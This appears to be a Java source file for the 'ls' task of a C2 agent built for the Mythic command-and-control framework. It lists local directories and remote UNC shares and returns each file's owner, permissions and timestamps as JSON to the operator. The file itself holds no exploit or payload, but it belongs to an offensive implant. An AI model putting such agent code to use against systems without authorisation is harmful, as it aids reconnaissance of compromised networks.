package com.woopsie.tasks;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.woopsie.Config;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.attribute.BasicFileAttributes;
import java.nio.file.attribute.PosixFileAttributes;
import java.nio.file.attribute.PosixFilePermissions;
import java.nio.file.attribute.UserPrincipal;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * List directory task with Mythic file browser support
 */
public class LsTask implements Task {
    
    private final ObjectMapper objectMapper = new ObjectMapper();
    
    @Override
    public String execute(Config config, JsonNode parameters) throws Exception {
        // Extract parameters
        String path = ".";
        String host = "";
        
        if (parameters != null) {
            if (parameters.has("path")) {
                path = parameters.get("path").asText();
                if (path == null || path.isEmpty()) {
                    path = ".";
                }
            }
            if (parameters.has("host")) {
                host = parameters.get("host").asText();
            }
        }
        
        Config.debugLog(config, "Listing directory: " + path);
        
        // Build file browser data structure
        Map<String, Object> fileBrowser = createFileBrowser(path, host, config);
        
        // Return as JSON string for Mythic
        return objectMapper.writeValueAsString(fileBrowser);
    }
    
    private Map<String, Object> createFileBrowser(String pathStr, String host, Config config) throws IOException {
        Path path;
        boolean isUncPath = false;
        
        // If host is specified, construct UNC path
        if (host != null && !host.isEmpty()) {
            // Build UNC path: \\host\path
            String uncPath = "\\\\" + host + "\\" + pathStr.replace("/", "\\");
            // Remove any leading backslash from pathStr if present
            uncPath = uncPath.replace("\\\\\\", "\\\\");
            pathStr = uncPath;
            isUncPath = true;
            path = Paths.get(pathStr);
        } else {
            // Detect UNC paths - proper format or malformed single backslash
            isUncPath = pathStr.startsWith("\\\\") || pathStr.startsWith("//");
            
            // Also check for malformed UNC paths that start with single backslash
            // Pattern: \hostname\share or \IP\share
            if (!isUncPath && pathStr.startsWith("\\") && pathStr.length() > 2) {
                // Fix malformed UNC path by adding missing backslash
                pathStr = "\\" + pathStr;
                isUncPath = true;
                Config.debugLog(config, "Fixed malformed UNC path: " + pathStr);
            }
            
            if (isUncPath) {
                // UNC path - ensure proper format with backslashes
                pathStr = pathStr.replace("/", "\\");
            }
            
            path = Paths.get(pathStr);
            
            // Resolve relative paths (but not UNC paths)
            if (!path.isAbsolute() && !isUncPath) {
                path = Paths.get(System.getProperty("user.dir")).resolve(path);
            }
            
            // Canonicalize the path (skip for UNC paths as they may not be accessible yet)
            if (!isUncPath) {
                path = path.toRealPath();
            }
        }
        
        if (!Files.exists(path)) {
            throw new IOException("Path does not exist: " + pathStr);
        }
        
        if (!Files.isDirectory(path)) {
            throw new IOException("Not a directory: " + pathStr);
        }
        
        List<Map<String, Object>> filesList = new ArrayList<>();
        
        // List all files in directory
        File[] files = path.toFile().listFiles();
        if (files != null) {
            for (File file : files) {
                try {
                    Map<String, Object> fileInfo = createFileInfo(file.toPath(), config);
                    filesList.add(fileInfo);
                } catch (Exception e) {
                    Config.debugLog(config, "Failed to get info for: " + file.getName() + " - " + e.getMessage());
                }
            }
        }
        
        // Build parent path
        String parentPath = path.getParent() != null ? path.getParent().toString() : "";
        
        // Create file browser structure
        Map<String, Object> fileBrowser = new HashMap<>();
        fileBrowser.put("host", host);  // Use host parameter as-is (empty for local, populated for UNC)
        fileBrowser.put("platform", getPlatform());
        fileBrowser.put("is_file", false);
        fileBrowser.put("permissions", createDefaultPermissions());
        fileBrowser.put("name", path.getFileName() != null ? path.getFileName().toString() : "");
        fileBrowser.put("parent_path", parentPath);
        fileBrowser.put("success", true);
        fileBrowser.put("access_time", 0);
        fileBrowser.put("modify_time", 0);
        fileBrowser.put("creation_date", 0);
        fileBrowser.put("size", 0);
        fileBrowser.put("update_deleted", true);
        fileBrowser.put("files", filesList);
        
        Config.debugLog(config, "Listed " + filesList.size() + " items");
        
        return fileBrowser;
    }
    
    private Map<String, Object> createFileInfo(Path path, Config config) throws IOException {
        BasicFileAttributes attrs = Files.readAttributes(path, BasicFileAttributes.class);
        
        Map<String, Object> fileInfo = new HashMap<>();
        fileInfo.put("is_file", attrs.isRegularFile());
        fileInfo.put("permissions", getFilePermissions(path));
        fileInfo.put("name", path.getFileName().toString());
        fileInfo.put("full_name", path.toAbsolutePath().toString());
        
        // Timestamps in milliseconds
        fileInfo.put("access_time", attrs.lastAccessTime().toMillis());
        fileInfo.put("modify_time", attrs.lastModifiedTime().toMillis());
        fileInfo.put("creation_date", attrs.creationTime().toMillis());
        
        fileInfo.put("size", attrs.size());
        fileInfo.put("owner", getFileOwner(path));
        
        return fileInfo;
    }
    
    private Map<String, Object> getFilePermissions(Path path) {
        Map<String, Object> permissions = new HashMap<>();
        List<Map<String, Object>> acls = new ArrayList<>();
        
        try {
            String os = System.getProperty("os.name").toLowerCase();
            
            if (os.contains("nix") || os.contains("nux") || os.contains("mac")) {
                // Unix-like permissions
                try {
                    PosixFileAttributes posixAttrs = Files.readAttributes(path, PosixFileAttributes.class);
                    String posixPerms = PosixFilePermissions.toString(posixAttrs.permissions());
                    
                    Map<String, Object> acl = new HashMap<>();
                    acl.put("account", posixAttrs.owner().getName());
                    acl.put("rights", posixPerms);
                    acl.put("type", "Unix Permissions");
                    acl.put("is_inherited", false);
                    acls.add(acl);
                } catch (Exception e) {
                    // Fallback to basic file permissions
                    File file = path.toFile();
                    String perms = (file.canRead() ? "r" : "-") +
                                 (file.canWrite() ? "w" : "-") +
                                 (file.canExecute() ? "x" : "-");
                    
                    Map<String, Object> acl = new HashMap<>();
                    acl.put("account", getFileOwner(path));
                    acl.put("rights", perms + perms + perms); // Simple rwxrwxrwx
                    acl.put("type", "Unix Permissions");
                    acl.put("is_inherited", false);
                    acls.add(acl);
                }
            } else {
                // Windows - use basic permissions for now
                File file = path.toFile();
                String perms = "";
                if (file.canRead()) perms += "Read, ";
                if (file.canWrite()) perms += "Write, ";
                if (file.canExecute()) perms += "Execute";
                perms = perms.replaceAll(", $", "");
                
                Map<String, Object> acl = new HashMap<>();
                acl.put("account", getFileOwner(path));
                acl.put("rights", perms.isEmpty() ? "None" : perms);
                acl.put("type", "Windows Permissions");
                acl.put("is_inherited", false);
                acls.add(acl);
            }
        } catch (Exception e) {
            // Default fallback
            Map<String, Object> acl = new HashMap<>();
            acl.put("account", "unknown");
            acl.put("rights", "unknown");
            acl.put("type", "Unknown");
            acl.put("is_inherited", false);
            acls.add(acl);
        }
        
        permissions.put("acls", acls);
        return permissions;
    }
    
    private Map<String, Object> createDefaultPermissions() {
        Map<String, Object> permissions = new HashMap<>();
        permissions.put("acls", new ArrayList<>());
        return permissions;
    }
    
    private String getFileOwner(Path path) {
        try {
            UserPrincipal owner = Files.getOwner(path);
            return owner.getName();
        } catch (Exception e) {
            return "unknown";
        }
    }
    
    private String getPlatform() {
        String os = System.getProperty("os.name", "Unknown");
        String version = System.getProperty("os.version", "");
        return os + (version.isEmpty() ? "" : " " + version);
    }
    
    @Override
    public String getCommandName() {
        return "ls";
    }
}
